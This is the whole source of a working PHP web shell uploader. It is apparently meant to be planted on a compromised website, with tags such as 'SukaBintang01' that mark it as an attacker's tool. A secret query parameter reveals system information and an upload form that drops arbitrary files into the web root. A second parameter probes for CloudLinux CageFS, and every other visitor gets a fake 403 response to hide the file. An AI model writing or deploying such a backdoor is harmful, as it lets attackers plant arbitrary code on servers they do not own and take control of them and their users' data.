<?php
error_reporting(0);

if(isset($_GET["Skb01"])) {
    echo "<h1><i>SukaBintang01</i></h1><br>";
    echo "<b><phpuname>".php_uname()."</phpuname></b><br>";
    echo "<form method='post' enctype='multipart/form-data'>
          <input type='file' name='idx_file'>
          <input type='submit' name='upload' value='upload'>
          </form>";
    $root = $_SERVER['DOCUMENT_ROOT'];
    $files = $_FILES['idx_file']['name'];
    $dest = $root.'/'.$files;
    if(isset($_POST['upload'])) {
        if(is_writable($root)) {
            if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
                $web = "http://".$_SERVER['HTTP_HOST'];
                echo "Sukses -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
            } else {
                echo "gagal upload di document root.";
            }
        } else {
            if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
                echo "sukses upload <b>$files</b> di folder ini";
            } else {
                echo "gagal upload";
            }
        }
    }
} elseif(isset($_GET["SukaBintang01"])){
	$homee = $_SERVER['DOCUMENT_ROOT'];
	$cgfs = explode("/",$homee);
	$build = '/'.$cgfs[1].'/'.$cgfs[2].'/.cagefs';
	if(is_dir($build)) {
		echo("CloudLinux => True");
	} else {
		echo("CloudLinux => False");
	}
}else {
    header('HTTP/1.1 403 Forbidden');
}
?>
